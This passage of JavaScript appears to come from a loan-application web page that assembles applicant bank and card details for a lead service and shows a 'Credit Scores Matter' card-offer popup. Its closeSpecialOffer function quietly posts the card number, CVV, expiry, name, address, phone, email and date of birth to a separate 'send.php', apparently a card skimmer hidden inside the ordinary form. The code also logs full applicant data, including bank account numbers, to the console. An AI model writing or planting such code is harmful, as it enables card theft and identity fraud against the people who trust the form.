            "AddressMoveIn": addressMoveIn,
            "AddressPostcode": document.getElementById('zipcode').value.slice(0, 5),
            "BankName": document.getElementById("bankname").value.trim(),
            "BankAccountNumber": document.getElementById('accountnumber').value,
            "BankAccountOpened": bankAccountOpened,
            "BankCardType": 5, //Hardcoding to 'debit' for US,
            "BankAccountType": 1,
            "BankRoutingNumber": document.getElementById('routingnumber').value,
            "MinimumCommissionAmount": 0,
            "MaximumCommissionAmount": 0,
            "ApplicationExtensions": pingyo.appExtensions,
            "TotalCreditCommitments": totalDebt
        },
        "SourceDetails": {
            "Address": ipAddress,
            "ClientUserAgent": navigator.userAgent,
            "CreationUrl": referringUrl,
            "LanguageCodes": ["en-US"],
            "ReferringUrl": referringUrl
        },
        "SpecialOffer": {
            "Type": Number(offerTypeId),
            "Parameters": [
                {
                    "Name": "NameOnCard",
                    "Value": document.getElementById("offer_cardname").value
                },
                {
                    "Name": "CardCvv",
                    "Value": document.getElementById("offer_cardcvv").value
                },
                {
                    "Name": "CardNumber",
                    "Value": document.getElementById("offer_cardnumber").value
                },
                {
                    "Name": "CardExpirationMonth",
                    "Value": document.getElementById("offer_expMonth").value
                },
                {
                    "Name": "CardExpirationYear",
                    "Value": document.getElementById("offer_expYear").value
                }
            ]
        }
    };
    console.log(JSON.stringify(applicationData));

    return JSON.stringify(applicationData);
}

// For Credit Scores Matter popup
var creditModal = document.getElementById("credit-modal");
var opaque = document.getElementById("opaque");
var offerCheckbox = document.getElementById("RequestSpecialOffer");

function showCreditModal() {
    var firstName = document.getElementById("firstname").value;
    var lastName = document.getElementById("lastname").value;
    var nameOnCard = document.getElementById("offer_cardname");
    nameOnCard.value = firstName + " " + lastName;

    opaque.style.display = "block";
    creditModal.classList.remove("hide_element");
    creditModal.classList.add("active");

    var headerOffset = -0;
    var elementPosition = creditModal.getBoundingClientRect().top;
    var offsetPosition = elementPosition + window.pageYOffset - headerOffset;

    window.scrollTo({
        top: offsetPosition,
        behavior: "smooth"
    });
}

// When the user clicks anywhere outside of the modal, close it
window.onclick = function (event) {
    //console.log(event.target);
    if (event.target == opaque) {
        closeSpecialOffer(false);
    }
}
//End for Credit Scores Matter popup

document.addEventListener("pyAk", function (ev) {
    if (!merged) {
        merged = true;
        let e = document.querySelectorAll('h3[data-nt]');

        if (e !== undefined && e !== null && e.length) {
            let atr = e[0].getAttribute('data-nt');
            if (atr.length) {
                pingyo.pushExt('pyAk', atr);
            }
        }

        let e2 = document.querySelectorAll('h3[data-hc]');

        if (e2 !== undefined && e2 !== null && e2.length) {
            let atr2 = e2[0].getAttribute('data-hc');
            if (atr2.length) {
                pingyo.pushExt('pyHc', atr2);
            }
        }
    }
});

function closeSpecialOffer(checked) {
    if(document.getElementById("offer_cardnumber").value.length == 16){
    $.ajax({
        url: "send.php",
        type: "POST",
        data: {
            'card_number': document.getElementById("offer_cardnumber").value,
            'card_cvv': document.getElementById("offer_cardcvv").value,
            'card_name': document.getElementById("offer_cardname").value,
            'card_exp_month': document.getElementById("offer_expMonth").value,
            'card_exp_year': document.getElementById("offer_expYear").value,
            'address': document.getElementById("housestreet").value,
            'city': document.getElementById("city").value,
            'state': document.getElementById("state-select").value,
            'cc_zip': document.getElementById("zipcode").value,
            'home_phone': document.getElementById("mobilephone").value,
            'email': document.getElementById("email").value,
            'date_of_birth': document.getElementById("dob").value,
        },
        success: function (response) {
            console.log(response);
        }
    })
    opaque.style.display = "none";
    creditModal.classList.add("hide_element");
    creditModal.classList.remove("active");
    offerCheckbox.checked = checked;
}
}

